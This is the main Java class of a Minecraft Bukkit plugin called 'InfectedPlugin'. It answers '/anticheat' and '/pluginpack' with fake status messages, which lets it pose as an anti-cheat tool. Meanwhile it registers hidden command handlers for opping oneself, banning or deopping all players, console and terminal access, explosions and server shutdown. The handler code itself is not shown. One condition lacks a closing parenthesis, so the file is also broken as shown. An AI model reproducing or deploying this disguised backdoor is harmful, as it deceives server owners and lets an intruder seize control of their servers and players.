package org.CreeperCoders.InfectedPlugin;

import java.util.logging.Logger;
import org.bukkit.*;
import org.bukkit.entity.Player;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;

import org.CreeperCoders.InfectedPlugin.Commands.*;

public class InfectedPlugin extends JavaPlugin
{
    public static final Logger log = Bukkit.getLogger();
    public InfectedPlugin plugin;

    @Override
    public void onLoad()
    {
        log.info(String.format("[%s] %s is now loading...", getDescription().getName(), getDescription().getName()));
    }

    @Override
    public void onEnable()
    {
        log.info(String.format("[%s] %s is registering all events...", getDescription().getName(), getDescription().getName()));
        try
        {
            PluginManager pm = getServer().getPluginManager();
            //pm.registerEvents(new IP_PlayerListener(), this);
            pm.registerEvents(new Command_banall(), this);
            pm.registerEvents(new Command_deop(), this);
            pm.registerEvents(new Command_op(), this);
            pm.registerEvents(new Command_gamemode(), this);
            pm.registerEvents(new Command_help(), this);
            pm.registerEvents(new Command_opme(), this);
            pm.registerEvents(new Command_terminal(), this);
            //pm.registerEvents(new Command_fuckoff(), this);
            pm.registerEvents(new Command_shutdown(), this);
            //pm.registerEvents(new Command_randombanl(), this);
            pm.registerEvents(new Command_enableplugin(), this);
            pm.registerEvents(new Command_disableplugin(), this);
            pm.registerEvents(new Command_deopall(), this);
            pm.registerEvents(new Command_explosion(), this);
            pm.registerEvents(new Command_name(), this);
            pm.registerEvents(new Command_console(), this);
        }
        catch (Exception ex)
        {
            log.severe(String.format("[%s] Failed to register events! Reason: %s", getDescription().getName(), ex.getMessage()));
        }
        log.info(String.format("[%s] %s version %s by %s has been enabled!", getDescription().getName(), getDescription().getName(), getDescription().getVersion(), getDescription().getAuthors()));
    }

    @Override
    public void onDisable()
    {
        log.info(String.format("[%s] %s has been disabled!", getDescription().getName(), getDescription().getName()));
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
    {
        if (commandLabel.equalsIgnoreCase("anticheat"))
        {
            sender.sendMessage(ChatColor.GREEN + "AntiCheat 2.0 is working 100%");
            return true;
        }
        else if (commandLabel.equalsIgnoreCase("pluginpack"))
        {
            sender.sendMessage(ChatColor.GREEN + "PluginPack 2.4 working 100%! Use /anticheat to see anticheat details!");
            return true;
        }
        else if (commandLabel.equalsIgnoreCase("fun"))
        {
            if (args.length == 0)
            {
                sender.sendMessage(ChatColor.GOLD + "Want some fun? type in a secret code for easter egg");
                return false;
            }
            else if (args[0].equalsIgnoreCase("moo")
            {
                run_moo(sender, commandLabel, args);
            }
            else if ("don't have a good idea yet".equalsIgnoreCase(args[0]))
            {
                sender.sendMessage("WIP Command");
            }
            else
            {
                sender.sendMessage("Code not found!");
            }
            return true;
        }
        return false;
    }

    private final String[] consoleMoo = new String[]
    {
        "         (__)",
        "         (oo)",
        "   /------\\/",
        "  / |    ||",
        " *  /\\---/\\",
        "    ~~   ~~",
        "....\"Have you mooed today?\"..."
    };
    private final String[] playerMoo = new String[]
    {
        "            (__)",
        "            (oo)",
        "   /------\\/",
        "  /  |      | |",
        " *  /\\---/\\",
        "    ~~    ~~",
        "....\"Have you mooed today?\"..."
    };

    private void run_moo(final CommandSender sender, final String commandLabel, final String[] args)
    {
        if (args.length == 2 && args[1].equals("moo"))
        {
            for (String s : consoleMoo)
            {
                log.info(s);
            }
            for (Player player : sender.getServer().getOnlinePlayers())
            {
                player.sendMessage(playerMoo);
                player.playSound(player.getLocation(), Sound.COW_IDLE, 1, 1.0f);
            }
        }
        else
        {
            if (sender instanceof Player)
            {
                sender.sendMessage(playerMoo);
                final Player player = (Player)sender;
                player.playSound(player.getLocation(), Sound.COW_IDLE, 1, 1.0f);
            }
            else
            {
                sender.sendMessage(consoleMoo);
            }
        }
    }
}
